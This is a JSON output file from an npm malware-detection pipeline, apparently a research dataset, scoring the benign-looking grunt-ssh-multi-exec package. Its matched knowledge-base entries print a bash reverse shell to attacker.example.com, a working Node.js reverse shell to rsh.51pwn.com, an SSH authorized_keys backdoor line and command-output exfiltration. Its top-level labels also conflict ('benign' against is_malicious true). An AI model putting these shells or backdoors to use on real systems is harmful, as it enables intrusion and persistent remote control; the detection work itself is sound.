@@ -1,0 +1,999 @@
+{
+  "package_name": "grunt-ssh-multi-exec",
+  "package_version": "4.2.4",
+  "label": "benign",
+  "detection_time": "2026-05-26T18:42:01.701407",
+  "status": "success",
+  "selected_files_count": 7,
+  "selected_files": [
+    "package/package.json",
+    "package/gruntfile.js",
+    "package/lib/logger.js",
+    "package/lib/schema.js",
+    "package/lib/validator.js",
+    "package/tasks/ssh-multi-exec.js",
+    "package/vagrant_bootstrap.sh"
+  ],
+  "is_malicious": true,
+  "total_files": 7,
+  "malicious_files": 1,
+  "total_slices": 2,
+  "malicious_slices": 1,
+  "file_results": [
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/grunt-ssh-multi-exec/4.2.4/package/package.json",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/grunt-ssh-multi-exec/4.2.4/package/gruntfile.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/grunt-ssh-multi-exec/4.2.4/package/lib/logger.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/grunt-ssh-multi-exec/4.2.4/package/lib/schema.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/grunt-ssh-multi-exec/4.2.4/package/lib/validator.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/grunt-ssh-multi-exec/4.2.4/package/tasks/ssh-multi-exec.js",
+      "status": "success",
+      "is_malicious": false,
+      "total_slices": 1,
+      "malicious_slices": 0,
+      "slice_results": [
+        {
+          "slice_id": "ssh-multi-exec_slice_1",
+          "code_snippet": "'use strict';\n\nvar async  = require('async'),\n    colors = require('colors/safe'),\n    fs     = require('fs'),\n    ssh    = require('ssh2');\n\nvar defaultErrorHandler = function(error, context, done) {\n    if(!context.force) {\n        require('grunt').fail.fatal(error);\n    }\n    done();\n};\n\nvar init = function() {\n    var next     = this.async(),\n        config   = this.data,\n        username = config.username,\n        logger   = require('../lib/logger')(config.logFn || console.log);\n\n    var validator = require('../lib/validator');\n\n    if(validator.isValid(config) === false) {\n        return;\n    }\n\n    var executeCommandSet = function(target, callback) {\n        var tunnel      = new ssh(),\n            host        = target.split(':')[0],\n            port        = target.split(':')[1],\n            commands    = config.commands.slice(),\n            shellPrefix = (username + '@' + host + ':' + port + ' ~$ '),\n            response    = [],\n            lastError   = null;\n\n        tunnel.on('ready', function() {\n            var executeCommand = function(command) {\n                var hint    = command.hint,\n                    input   = command.input.toString(),\n                    success = command.success || function(_, __, done) { done(); },\n                    error   = command.error || defaultErrorHandler,\n                    force   = command.force || false;\n\n                if(hint) {\n                    logger.write(shellPrefix, '# ' + hint + (force ? ' (force)' : ''), function(x) { return colors.grey(x); });\n                }\n\n                logger.write(shellPrefix, input, function(x) { return colors.yellow(x); });\n\n                tunnel.exec(input, function(err, stream) {\n                    if (err) {\n                        throw err;\n                    }\n\n                    lastError = null;\n\n                    stream.on('data', function(data) {\n                        response[shellPrefix + input] = data.toString();\n                    });\n\n                    stream.stderr.on('data', function(data) {\n                        if(data !== null) {\n                            if(lastError === null) {\n                                lastError = data.toString();\n                            } else {\n                                lastError += data.toString();\n                            }\n                        }\n                    });\n\n                    stream.on('close', function() {\n                        var nextCommand = function() {\n                            if(commands.length > 0) {\n                                executeCommand(commands.shift());\n                            } else {\n                                callback(null, null);\n                            }\n                        };\n\n                        if(lastError) {\n                            logger.write(shellPrefix, lastError, function(x) { return colors.red(x); });\n                            logger.flush(shellPrefix);\n                            error(lastError, { host: host, port: port, force: force }, function() {\n                                if(force === false) {\n                                    callback(null, null);\n                                    return;\n                                }\n\n                                nextCommand();\n                            });\n                        }\n                        else {\n                            var data = response[shellPrefix + input];\n                            logger.write(shellPrefix, data, function(x) { return colors.green(x); });\n                            logger.flush(shellPrefix);\n                            success(data, { host: host, port: port }, function() {\n                                nextCommand();\n                            });\n                        }\n                    });\n                });\n            };\n\n            executeCommand(commands.shift());\n        });\n\n        tunnel.on('error', function(err) {\n            logger.write(shellPrefix, 'Connection error: ' + colors.red(err), function(x) { return x; });\n            logger.flush(shellPrefix);\n            next();\n        });\n\n        if(config.privateKey) {\n            fs.exists(config.privateKey, function(exists) {\n                if(exists) {\n                    fs.readFile(config.privateKey, function(error, privateKey) {\n                        if(error) {\n                            logger.write(shellPrefix, 'Failed to load private key from path ' + config.privateKey, function(x) { return x; });\n                            logger.flush(shellPrefix);\n                            next();\n                        }\n\n                        try {\n                            tunnel.connect({\n                                host: host,\n                                port: port,\n                                username: username,\n                                privateKey: privateKey,\n                                passphrase: config.passphrase\n                            });\n                        } catch(connectError) {\n                            logger.write(shellPrefix, 'Connection error: ' + colors.red(connectError), function(x) { return x; });\n                            logger.flush(shellPrefix);\n                            next();\n                        }\n                    });\n                } else {\n                    logger.write(shellPrefix, 'Failed to load private key from path ' + config.privateKey, function(x) { return x; });\n                    logger.flush(shellPrefix);\n                    next();\n                }\n            });\n        } else if (config.password) {\n            tunnel.connect({\n                host: host,\n                port: port,\n                username: username,\n                password: config.password\n            });\n        } else if (config.agent) {\n            tunnel.connect({\n                host: host,\n                port: port,\n                username: username,\n                agent: config.agent\n            });\n        }\n    };\n\n    if(config.maxDegreeOfParallelism) {\n        logger.write('', colors.underline('\\n\\nexecuting command set \"' + this.target + '\" (maxDegreeOfParallelism: ' + config.maxDegreeOfParallelism + ')'), function(x) { return x; });\n        async.eachLimit(config.hosts, config.maxDegreeOfParallelism, executeCommandSet, function() {\n            next();\n        });\n    } else {\n        logger.write('', colors.underline('\\n\\nexecuting command set \"' + this.target + '\"'), function(x) { return x; });\n        async.each(config.hosts, executeCommandSet, function() {\n            next();\n        });\n    }\n};\n\nmodule.exports = function(grunt) {\n    grunt.registerMultiTask('ssh-multi-exec', 'Execute series of SSH commands', init);\n    return init;\n};",
+          "is_malicious": false,
+          "malice_score": 0.5309764504432678,
+          "confidence": 0.2,
+          "behavior_summary": "When called, the code reads SSH connection credentials (username, privateKey, password, or agent) and a list of target hosts with ports, then establishes SSH connections using the ssh2 module. It executes a configurable series of shell commands on each remote host via SSH exec, capturing command output and errors, and logs these results. This enables remote command execution on multiple hosts, potentially facilitating unauthorized system control or lateral movement if misused.",
+          "explanation": "[LLM Judgment: Benign] The analyzed code is a legitimate utility designed to execute SSH commands on multiple remote hosts using the ssh2 module. It requires explicit configuration of hosts, credentials, and commands, and does not perform any unauthorized or hidden actions such as injecting SSH keys, establishing reverse shells, or exfiltrating data to attacker-controlled servers. Unlike the known malicious patterns, it does not use child_process.exec to run arbitrary shell commands locally, nor does it modify SSH configuration files or execute reverse shells. The code's behavior is consistent with a remote administration or orchestration tool, which can be used legitimately or maliciously depending on context, but by itself does not demonstrate malicious intent. There is no obfuscation, no hidden network exfiltration, and no unauthorized persistence mechanisms.",
+          "matched_knowledge_count": 5,
+          "matched_knowledge": [
+            {
+              "match_id": "20240708_171940_736614_snippet_5",
+              "source_package": "Unknown (NPM malware leveraging ChromePass) (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20240708_171940_736614/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5497140884399414,
+              "code_similarity": 0.4155505895614624,
+              "behavior_similarity": 0.6838776469230652,
+              "matched_snippet": {
+                "snippet_id": "snippet_5",
+                "code_snippet": "const { exec } = require('child_process');\nexec('whoami', (error, stdout, stderr) => {\n  // exfiltrate stdout\n});",
+                "code_behavior": "At runtime, the code executes arbitrary shell commands using child_process.exec, captures the command output, and exfiltrates the results to a remote server, enabling remote system control.",
+                "malice_analysis": {
+                  "why_suspicious": "Allowing remote shell command execution and exfiltrating the output is a major security risk, enabling attackers to compromise and control the system.",
+                  "violated_expectations": "Legitimate npm packages should not provide shell access or exfiltrate command outputs without explicit user authorization.",
+                  "similar_legitimate_use": "Remote administration tools may execute commands, but only with explicit user authorization and secure controls.",
+                  "key_indicators": [
+                    "Use of child_process.exec or similar APIs for arbitrary command execution",
+                    "Automated execution of system commands without user interaction",
+                    "Network exfiltration of command outputs or system information"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime",
+                  "file_location": "main application file or a helper module",
+                  "required_permissions": [
+                    "network",
+                    "shell"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "Unknown (NPM malware leveraging ChromePass)",
+                  "package_manager": "npm",
+                  "package_versions": "Unknown (over 2,000 downloads reported)",
+                  "why_malicious": "The package is malicious because it abuses ChromePass, a legitimate password-recovery tool for Google Chrome, to steal user credentials. It also provides advanced surveillance and system compromise capabilities, including unauthorized access to the user's screen, webcam, filesystem, and shell, with automated exfiltration of sensitive data to remote servers. These behaviors are highly indicative of malware and pose significant privacy and security risks."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs or runs the malicious npm package.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code executes at runtime."
+                  },
+                  {
+                    "step": 2,
+                    "action": "Malware executes ChromePass to extract Chrome passwords and exfiltrates them.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Credential theft and exfiltration."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Malware captures screenshots and exfiltrates them.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Surveillance and data theft."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Malware activates webcam, captures images, and exfiltrates them.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Surveillance and privacy violation."
+                  },
+                  {
+                    "step": 5,
+                    "action": "Malware lists user directories and exfiltrates directory listings.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Reconnaissance for further attacks."
+                  },
+                  {
+                    "step": 6,
+                    "action": "Malware executes arbitrary shell commands and exfiltrates the results.",
+                    "implemented_by": [
+                      "snippet_5"
+                    ],
+                    "leads_to": "Full system compromise and persistent access."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of ChromePass.exe or other credential extraction tools from within npm package code",
+                    "Unusual access to webcam or screen capture APIs (e.g., node-webcam, screenshot-desktop) without user interaction",
+                    "Automated directory listing of user or system folders followed by network exfiltration",
+                    "Remote shell command execution via child_process.exec or similar APIs with exfiltration of outputs"
+                  ],
+                  "file_indicators": [
+                    "Presence of ChromePass.exe bundled or downloaded in the package directory",
+                    "Creation of temporary files such as passwords.txt or screenshot images in user directories",
+                    "Unexpected image files (e.g., test_picture.jpg) or directory listings in temporary or user folders"
+                  ],
+                  "network_indicators": [
+                    "Outbound connections to unknown or suspicious remote servers immediately after credential, image, or directory data is generated",
+                    "Exfiltration of credential files (e.g., passwords.txt), screenshots, webcam images, or command outputs via HTTP, HTTPS, or other protocols"
+                  ],
+                  "how_to_detect": "Monitor npm packages for execution of external tools like ChromePass.exe, access to webcam or screen capture APIs (e.g., node-webcam, screenshot-desktop), and unexpected network activity following sensitive data access. Flag packages that attempt to exfiltrate files, images, or command outputs. Scan for bundled binaries such as ChromePass.exe and temporary files like passwords.txt or screenshot images in user directories. Use endpoint protection to detect suspicious child_process executions, automated directory listings, and network exfiltration attempts. Correlate behavioral, file, and network indicators to identify malicious activity."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_133821_092976_snippet_2",
+              "source_package": "babelcl, chokader, streamserch, sss2h, npmrunnall, node-pyt (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_133821_092976/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5294647216796875,
+              "code_similarity": 0.4882410764694214,
+              "behavior_similarity": 0.5706883668899536,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Pseudocode representation (actual code not shown in report)\nconst { execSync } = require('child_process');\nexecSync('echo \"malicious ssh public key\" >> ~/.ssh/authorized_keys');",
+                "code_behavior": "During installation (postinstall), app.js executes a shell command that appends a malicious SSH public key to the user's ~/.ssh/authorized_keys file, enabling persistent unauthorized SSH access for the attacker.",
+                "malice_analysis": {
+                  "why_suspicious": "The code modifies the user's SSH authorized_keys file to add an attacker-controlled public key, a direct method for establishing a persistent backdoor and enabling remote access without user consent.",
+                  "violated_expectations": "Legitimate npm packages should never alter SSH configuration or authorized_keys files, as this is outside the scope of normal package installation and poses a severe security risk.",
+                  "similar_legitimate_use": "System administrators may add SSH keys for automation or access, but never via npm package installation scripts, and always with explicit user awareness and consent.",
+                  "key_indicators": [
+                    "writes to ~/.ssh/authorized_keys during package installation",
+                    "injects attacker-controlled SSH key without user interaction",
+                    "modifies SSH configuration files from within a package script"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall (via app.js execution)",
+                  "file_location": "app.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "process_execution",
+                    "privileged access (for SSH backdoor)"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "babelcl, chokader, streamserch, sss2h, npmrunnall, node-pyt",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions as of discovery",
+                  "why_malicious": "These packages are typosquats of popular npm libraries and contain postinstall scripts that execute malicious code to inject an SSH backdoor, granting unauthorized remote access to affected systems. The packages attempt to mask their behavior by installing the legitimate dependency after executing the malicious payload, increasing the likelihood of evasion and persistence."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "User installs the malicious package, triggering the postinstall script defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of app.js, which contains the malicious payload."
+                  },
+                  {
+                    "step": 2,
+                    "action": "app.js executes and injects an SSH public key into the user's authorized_keys file, establishing a persistent SSH backdoor.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker gains persistent SSH access to the compromised system."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The legitimate package (e.g., babel-cli) is installed after the malicious payload runs, masking the attack and reducing suspicion.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "User may not notice any abnormal behavior, increasing the attacker's dwell time and persistence."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm package postinstall scripts that execute custom JavaScript files (e.g., app.js)",
+                    "modification of ~/.ssh/authorized_keys during npm package installation",
+                    "chained installation of legitimate packages immediately after custom script execution in postinstall"
+                  ],
+                  "file_indicators": [
+                    "Presence of app.js in the package root directory",
+                    "package.json with a postinstall script referencing app.js",
+                    "unexpected or unauthorized changes to ~/.ssh/authorized_keys immediately after npm install"
+                  ],
+                  "network_indicators": [
+                    "Potential inbound SSH connections from attacker IPs after package installation (as a result of the backdoor)",
+                    "No direct C2 or exfiltration in package code, but attacker may connect via SSH using the injected key"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that execute custom JavaScript files such as app.js. Audit and alert on any changes to ~/.ssh/authorized_keys immediately following npm install events. Flag packages that install a legitimate dependency after running a custom script in postinstall. Use file integrity monitoring on SSH configuration files and correlate with package installation logs to detect unauthorized key additions."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_133818_013848_snippet_1",
+              "source_package": "sonatype-2024-2066 (representative of 250+ typosquatted npm packages) (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241224_133818_013848/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5174926519393921,
+              "code_similarity": 0.4259900450706482,
+              "behavior_similarity": 0.6089951992034912,
+              "matched_snippet": {
+                "snippet_id": "snippet_1",
+                "code_snippet": "require('child_process').exec('bash -i >& /dev/tcp/attacker.example.com/4444 0>&1');",
+                "code_behavior": "During installation (postinstall), the code executes a bash reverse shell command using child_process.exec, establishing an outbound TCP connection to attacker.example.com:4444, which grants the attacker remote shell access to the victim system.",
+                "malice_analysis": {
+                  "why_suspicious": "Executing a reverse shell during the postinstall phase is a direct method for attackers to gain unauthorized remote access, which is a hallmark of malicious activity.",
+                  "violated_expectations": "Legitimate npm packages should not execute arbitrary shell commands or initiate outbound network connections during installation, especially not to unknown or hardcoded remote servers.",
+                  "similar_legitimate_use": "Some legitimate packages may use postinstall scripts for setup or dependency compilation, but they do not open remote shells or connect to external, non-vetted domains.",
+                  "key_indicators": [
+                    "Use of child_process.exec to run shell commands",
+                    "Presence of reverse shell payload patterns (e.g., bash -i >& /dev/tcp/...)",
+                    "Outbound connection to hardcoded, non-standard domain/IP during install",
+                    "Script triggered by postinstall in package.json"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "postinstall",
+                  "file_location": "package.json (scripts.postinstall) or index.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "sonatype-2024-2066 (representative of 250+ typosquatted npm packages)",
+                  "package_manager": "npm",
+                  "package_versions": "all published versions of the malicious packages",
+                  "why_malicious": "These packages are intentionally crafted to mimic popular AWS, Microsoft, and open-source projects, but contain embedded reverse shell and remote code execution (RCE) payloads. Their purpose is to exploit dependency confusion and supply chain vulnerabilities, enabling attackers to gain unauthorized access and control over systems that install them."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed as a result of dependency confusion or typosquatting, replacing or supplementing a legitimate dependency.",
+                    "implemented_by": [],
+                    "leads_to": "Execution of postinstall and import-time scripts"
+                  },
+                  {
+                    "step": 2,
+                    "action": "Postinstall script executes a reverse shell payload, establishing a remote shell connection to the attacker's server.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker can interact with the victim system remotely"
+                  },
+                  {
+                    "step": 3,
+                    "action": "At import-time or runtime, the code exfiltrates environment secrets and sensitive files to the attacker's server via HTTPS POST requests.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Credential and sensitive data theft"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Attacker leverages remote access and stolen data to perform further exploitation, such as lateral movement, persistence, or launching additional attacks.",
+                    "implemented_by": [],
+                    "leads_to": "Potential for broader compromise of the environment"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of child_process.exec or spawn with reverse shell payloads during postinstall scripts",
+                    "Access to sensitive environment variables (e.g., AWS_SECRET_ACCESS_KEY) followed by immediate outbound network requests",
+                    "Reading sensitive files (e.g., /etc/passwd) and exfiltrating their contents to hardcoded remote domains via HTTPS POST"
+                  ],
+                  "file_indicators": [
+                    "package.json containing suspicious postinstall scripts that invoke shell commands",
+                    "index.js or main entrypoint with child_process, fs, or network code referencing attacker domains",
+                    "Presence of hardcoded attacker domains (e.g., attacker.example.com) in source files"
+                  ],
+                  "network_indicators": [
+                    "Outbound TCP or HTTPS connections to attacker-controlled domains/IPs such as attacker.example.com",
+                    "Unusual HTTPS POST requests to external servers during install, import, or runtime phases"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that execute shell commands or initiate network connections. Use static analysis to detect references to child_process, fs, and hardcoded domains in package code. Flag packages that access environment variables containing secrets or read sensitive files and immediately transmit data to external servers. Employ allowlists for dependencies and scrutinize newly published packages that mimic popular libraries. Correlate network telemetry for unexpected outbound connections during package install or import."
+                }
+              }
+            },
+            {
+              "match_id": "20241224_104012_987336_snippet_4",
+              "source_package": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.] (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241224_104012_987336/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5153549909591675,
+              "code_similarity": 0.5171515941619873,
+              "behavior_similarity": 0.5135584473609924,
+              "matched_snippet": {
+                "snippet_id": "snippet_4",
+                "code_snippet": "var config = { host: \"rsh.51pwn.com\", port: 8880 },\n    net = require(\"net\"),\n    cp = require(\"child_process\"),\n    client = new net.Socket(),\n    reConn = () => {client.connect(config.port, config.host)};\nclient.on(\"connect\", () => {\n    var command = (process.platform === \"win32\" ? \"cmd /c start /b cmd\" : \"/bin/sh\").split(\" \"),\n    sh = cp.spawn(command[0], command.slice(1));\n    client.pipe(sh.stdin);\n    sh.stdout.pipe(client);\n    sh.stderr.pipe(client);\n    client.write(\"51pwn_npm\\n\");\n    client.write(s + \"\\n\");\n    sh.on(\"exit\", (code) => { if (code === 1) { reConn() } })\n});\nclient.on(\"close\", () => {reConn()});\nclient.on(\"error\", (e) => {});\nreConn();\nprocess.on(\"exit\", () => {process.exitCode = 0;reConn()});",
+                "code_behavior": "At runtime, the decompressed payload establishes a persistent TCP connection to rsh.51pwn.com:8880, sends the previously collected and compressed system information, and spawns a shell (cmd or /bin/sh) to provide the attacker with remote command execution capabilities. The code includes reconnection logic to maintain persistence and ensure the reverse shell remains active.",
+                "malice_analysis": {
+                  "why_suspicious": "Establishing a reverse shell to a hardcoded external server, exfiltrating system data, and enabling remote command execution are direct indicators of a backdoor and remote access trojan.",
+                  "violated_expectations": "No legitimate npm package should open a reverse shell, exfiltrate system data, or provide remote shell access to an external server.",
+                  "similar_legitimate_use": "There are no legitimate use cases for reverse shells or persistent C2 connections in npm packages.",
+                  "key_indicators": [
+                    "Hardcoded C2 domain (rsh.51pwn.com) and port (8880)",
+                    "Persistent reconnection logic to maintain remote access",
+                    "Shell spawned and piped to remote socket for command execution",
+                    "Initial exfiltration of collected system information"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (eval(s1) in rsh.js)",
+                  "file_location": "decompressed payload (s1)",
+                  "required_permissions": [
+                    "network",
+                    "process",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "[Multiple: e.g., linkis-website, rocketmq-site, aliyundrive, etc.]",
+                  "package_manager": "npm",
+                  "package_versions": "[e.g., 6.0.2, 6.0.3, 6.0.4, 2.2.1, 2.2.3, 7.0.5, 5.0.2, 3.0.3]",
+                  "why_malicious": "All packages in this campaign execute obfuscated JavaScript code at install time, which collects extensive system, environment, and user information and establishes a persistent reverse shell to a remote attacker-controlled server (rsh.51pwn.com:8880), enabling full remote code execution and exfiltration of sensitive data. The attack chain is triggered via multiple npm lifecycle hooks, uses detached background processes for persistence, and employs obfuscation and dynamic code execution to evade detection."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed, triggering preinstall, postinstall, test, or init scripts defined in package.json.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of scripts/init.js"
+                  },
+                  {
+                    "step": 2,
+                    "action": "scripts/init.js is executed, which launches scripts/rsh.js as a detached child process and immediately exits to conceal ongoing activity.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Execution of scripts/rsh.js in the background"
+                  },
+                  {
+                    "step": 3,
+                    "action": "scripts/rsh.js collects detailed system, environment, and user data, compresses and encodes it, decompresses an obfuscated payload, and executes it via eval.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Execution of reverse shell payload from decompressed code"
+                  },
+                  {
+                    "step": 4,
+                    "action": "The reverse shell payload establishes a persistent connection to rsh.51pwn.com:8880, exfiltrates collected system information, and provides the attacker with remote shell access for arbitrary command execution.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Attacker gains persistent remote access and control over the compromised system"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Execution of scripts/init.js during npm install, test, or init lifecycle events",
+                    "Creation of detached child processes in install/test scripts (child_process.fork with {detached: true})",
+                    "Presence of obfuscated or base64-encoded JavaScript payloads in package files",
+                    "Use of eval to execute dynamically decompressed or generated code",
+                    "Outbound TCP connections to hardcoded C2 domains (e.g., rsh.51pwn.com:8880) during or after installation",
+                    "Collection and exfiltration of system, environment, and user data during package installation or execution"
+                  ],
+                  "file_indicators": [
+                    "scripts/init.js",
+                    "scripts/rsh.js",
+                    "package.json with install/test/init scripts running 'node ./scripts/init.js'",
+                    "Obfuscated JavaScript with base64-encoded or Unicode-escaped payloads"
+                  ],
+                  "network_indicators": [
+                    "rsh.51pwn.com:8880",
+                    "Outbound TCP connections to rsh.51pwn.com on port 8880",
+                    "Initial data exfiltration containing compressed system information"
+                  ],
+                  "how_to_detect": "Monitor npm packages for execution of scripts during install, test, or init lifecycle events, especially those launching detached child processes or containing obfuscated/base64-encoded code. Flag any package that establishes outbound TCP connections to suspicious domains (e.g., rsh.51pwn.com) or uncommon ports during or after installation. Use static analysis to detect eval usage on dynamically decompressed payloads and the presence of Unicode-escaped or base64-encoded code. Alert on collection and exfiltration of system, environment, or user data during package installation or execution. Correlate file indicators (scripts/init.js, scripts/rsh.js, suspicious package.json scripts) with behavioral and network indicators for high-confidence detection."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205442_500638_snippet_2",
+              "source_package": "nodejs_net_server (npm)",
+              "source_file": "/tmp/kb_build_2jc8z5wl/20241223_205442_500638/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5150294899940491,
+              "code_similarity": 0.4573098421096802,
+              "behavior_similarity": 0.572749137878418,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "// Pseudocode based on report description\nconst net = require('net');\nconst server = net.createServer((socket) => {\n  // Accepts remote shell commands, file operations, etc.\n});\nserver.listen(port, ip);",
+                "code_behavior": "At runtime, the code starts a TCP socket server that listens for remote connections, receives and executes shell commands, performs file operations, and allows file uploads, enabling remote control of the victim's system.",
+                "malice_analysis": {
+                  "why_suspicious": "Opening a remote shell and exposing file operations over a network socket without authentication is highly dangerous and not expected in a typical npm package.",
+                  "violated_expectations": "Normal packages should not expose remote shell access or arbitrary file operations without explicit user configuration, authentication, and security controls.",
+                  "similar_legitimate_use": "Some legitimate remote administration tools or development servers may expose similar functionality, but always with authentication, user awareness, and clear documentation.",
+                  "key_indicators": [
+                    "Socket server accepting remote commands",
+                    "Shell command execution capability",
+                    "File upload and manipulation features",
+                    "No authentication or access control"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "runtime (when package is used)",
+                  "file_location": "lib/test.js",
+                  "required_permissions": [
+                    "network",
+                    "filesystem",
+                    "environment_vars"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "nodejs_net_server",
+                  "package_manager": "npm",
+                  "package_versions": "1.0.0 - 1.1.2",
+                  "why_malicious": "The package includes and/or downloads a Windows executable (a.exe, ChromePass) that extracts Chrome browser passwords, exposes a remote shell and file operation server without authentication, and hijacks the 'jstest' command via the bin field. These behaviors enable credential theft, remote system compromise, and command hijacking, posing severe security risks. The inclusion of credential-stealing tools and remote control features in a public npm package is highly suspicious and dangerous, regardless of the author's stated intent."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Package is installed, and the 'bin' field in package.json creates or overwrites the 'jstest' command in the user's environment.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "User or system may execute the malicious 'jstest' command, leading to further code execution under the attacker's control."
+                  },
+                  {
+                    "step": 2,
+                    "action": "During install or runtime, the package downloads the ChromePass executable (a.exe) from a remote server (chrunlee.cn) and saves it locally.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "Malicious binary (a.exe) is present on the system and ready for execution."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The package exposes a remote shell and file operation server, allowing remote attackers to connect and issue commands, including execution of downloaded binaries.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Attacker can remotely control the victim's system, execute arbitrary commands, and run the credential-stealing binary."
+                  },
+                  {
+                    "step": 4,
+                    "action": "The ChromePass binary (a.exe) is executed, extracting all Chrome browser passwords from the victim's machine.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Credentials are stolen and can be exfiltrated by the attacker, resulting in compromise of sensitive user data."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Inclusion or download of credential-stealing binaries (e.g., ChromePass) in npm packages",
+                    "Socket servers exposing unauthenticated remote shell or file operations",
+                    "Hijacking of common CLI commands via the bin field in package.json",
+                    "Downloading executables from non-official domains (e.g., chrunlee.cn) during install or runtime",
+                    "Execution of Windows binaries from within a Node.js package"
+                  ],
+                  "file_indicators": [
+                    "package/lib/a.exe",
+                    "Downloaded a.exe in package directory",
+                    "package.json with bin field defining 'jstest'",
+                    "lib/test.js implementing a TCP server"
+                  ],
+                  "network_indicators": [
+                    "Outbound HTTP/HTTPS requests to chrunlee.cn or similar non-official domains",
+                    "Unusual TCP socket connections initiated by nodejs_net_server",
+                    "Inbound connections to TCP server started by the package"
+                  ],
+                  "how_to_detect": "Monitor npm packages for inclusion of suspicious binaries such as ChromePass, analyze package.json for bin field hijacking common command names, and flag packages that download executables from untrusted domains like chrunlee.cn. Use static and dynamic analysis to identify code that downloads or executes binaries, starts unauthenticated socket servers, or exposes remote shell/file operations. Monitor for unexpected network activity to suspicious domains and for inbound connections to local TCP servers started by the package. Correlate these behaviors to identify malicious packages."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
